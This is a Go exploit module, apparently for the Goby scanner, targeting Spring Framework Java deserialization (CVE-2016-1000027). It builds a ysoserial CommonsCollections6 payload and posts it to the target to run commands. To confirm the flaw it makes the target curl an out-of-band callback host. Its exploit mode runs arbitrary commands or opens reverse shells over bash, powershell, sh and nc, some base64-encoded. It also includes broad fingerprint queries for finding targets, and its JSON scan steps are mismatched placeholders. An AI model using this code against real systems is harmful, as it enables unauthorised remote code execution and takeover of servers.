package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/goscanner/ysoserial"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Spring-Framework Code Execution Vulnerability(CVE-2016-1000027)",
    "Description": "<p>Pivotal Software Spring Framework is an open-source Java, JavaEE application framework provided by the American company Pivotal Software. This framework can help developers build high-quality applications.</p>",
    "Product": "Spring-Framework",
    "Homepage": "https://spring.io/projects/spring-framework",
    "DisclosureDate": "2024-10-25",
    "PostTime": "2024-10-28",
    "Author": "Town",
    "FofaQuery": "body=\"<h1>Spring + Hibernate + SpringMVC/Struts basic project.</h1>\" || header=\"SpringBoot\" || banner=\"SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\") || title=\"Spring Batch Admin\" || title=\"Spring Batch Lightmin\" || header=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || banner=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || header=\"realm=\\\"Spring Security Application\" || banner=\"realm=\\\"Spring Security Application\" || header=\"Apache-Coyote\" || banner=\"Apache-Coyote\" || body=\"href=\\\"tomcat.css\" || title=\"Apache Tomcat\" || (title=\"Error report\" && title!=\"JBoss\") || body=\"This is the default Tomcat home page\" || server=\"tomcat\" || body=\"<h3>Apache Tomcat\" || banner=\"Tomcat\" || header=\"Tomcat\" || title=\"spring framework\" || header=\"JSESSIONID\" || banner=\"JSESSIONID\"",
    "GobyQuery": "body=\"<h1>Spring + Hibernate + SpringMVC/Struts basic project.</h1>\" || header=\"SpringBoot\" || banner=\"SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\") || title=\"Spring Batch Admin\" || title=\"Spring Batch Lightmin\" || header=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || banner=\"org.springframework.web.servlet.i18n.CookieLocaleResolver.locale=\" || header=\"realm=\\\"Spring Security Application\" || banner=\"realm=\\\"Spring Security Application\" || header=\"Apache-Coyote\" || banner=\"Apache-Coyote\" || body=\"href=\\\"tomcat.css\" || title=\"Apache Tomcat\" || (title=\"Error report\" && title!=\"JBoss\") || body=\"This is the default Tomcat home page\" || server=\"tomcat\" || body=\"<h3>Apache Tomcat\" || banner=\"Tomcat\" || header=\"Tomcat\" || title=\"spring framework\" || header=\"JSESSIONID\" || banner=\"JSESSIONID\"",
    "Level": "2",
    "Impact": "<p>The vulnerability still exists in the latest version of 5.x (5.3.27), and the official has not provided any solutions. After spring-web 6.0, the vulnerability does not exist. </p><p>Affected range: spring-web &lt; 6.0</p>",
    "Recommendation": "<p>Upgrade to the latest version of Spring 6, as Spring 6 starts to support the minimum JDK version is JDK 17, so if the JDK version is lower than 17, it is necessary to upgrade JDK first.</p>",
    "References": [
        "https://gitcode.com/gh_mirrors/cv/cve-2016-1000027-poc/overview?utm_source=artical_gitcode&index=bottom&type=card&webUrl"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByPowershellBase64,ByBash,ByPowershell,BySh,ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2016-1000027"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.8",
    "Translation": {
        "CN": {
            "Name": "Spring-Framework代码执行漏洞（CVE-2016-1000027）",
            "Product": "Spring-Framework",
            "Description": "<p>Pivotal Software Spring Framework是美国Pivotal Software公司的一套开源的Java、JavaEE应用程序框架。该框架可帮助开发人员构建高质量的应用。</p>",
            "Recommendation": "<p>升级到spring6的最新版本，由于spring6开始支持的最小jdk是jdk17，所以jdk版本如果低于17，则需要先升级jdk。<br></p>",
            "Impact": "<p>该漏洞在5.x的最新版本(5.3.27)依然存在,官方未给出任何解决办法。在spring-web6.0之后，则不存在该漏洞。<br></p><p>受影响范围:spring-web&lt;6.0<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Spring-Framework Code Execution Vulnerability(CVE-2016-1000027)",
            "Product": "Spring-Framework",
            "Description": "<p>Pivotal Software Spring Framework is an open-source Java, JavaEE application framework provided by the American company Pivotal Software. This framework can help developers build high-quality applications.<br></p>",
            "Recommendation": "<p>Upgrade to the latest version of Spring 6, as Spring 6 starts to support the minimum JDK version is JDK 17, so if the JDK version is lower than 17, it is necessary to upgrade JDK first.<br></p>",
            "Impact": "<p>The vulnerability still exists in the latest version of 5.x (5.3.27), and the official has not provided any solutions. After spring-web 6.0, the vulnerability does not exist.&nbsp;</p><p>Affected range: spring-web &lt; 6.0<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9963"
}`

	//setPayloadRequestHash函数需要再后面增加随机字符串，避免重名
	setPayloadRequest85B7gfLXlo5tUxBwOfCgqFIs2j8saBLA := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		headers := map[string]string{
			"Content-Type":    "application/x-java-serialized-object",
			"Accept-Encoding": "gzip",
		}
		PostRequest := httpclient.NewPostRequestConfig("/")
		PostRequest.Timeout = 30
		PostRequest.VerifyTls = false
		PostRequest.FollowRedirect = false
		for headName, headValue := range headers {
			PostRequest.Header.Store(headName, headValue)
		}
		binaryData, err := hex.DecodeString(ysoserial.GenCommonsCollections6Hex(command))
		if err != nil {
			return false, "", err
		}
		PostRequest.Data = string(binaryData)
		_, err = httpclient.DoHttpRequest(hostInfo, PostRequest)
		if err != nil {
			return false, "", err
		}
		vulURL = "/"
		return true, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequest85B7gfLXlo5tUxBwOfCgqFIs2j8saBLA函数赋值给runPayload
			runPayload := setPayloadRequest85B7gfLXlo5tUxBwOfCgqFIs2j8saBLA

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(6)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			if isDomain {
				checkUrl = "http://" + godclient.GetGodServerIP() + "/U" + strings.Split(checkUrl, ".")[1] + "." + strings.Split(checkUrl, ".")[0]
			}

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequest85B7gfLXlo5tUxBwOfCgqFIs2j8saBLA函数赋值给runPayload
			runPayload := setPayloadRequest85B7gfLXlo5tUxBwOfCgqFIs2j8saBLA

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
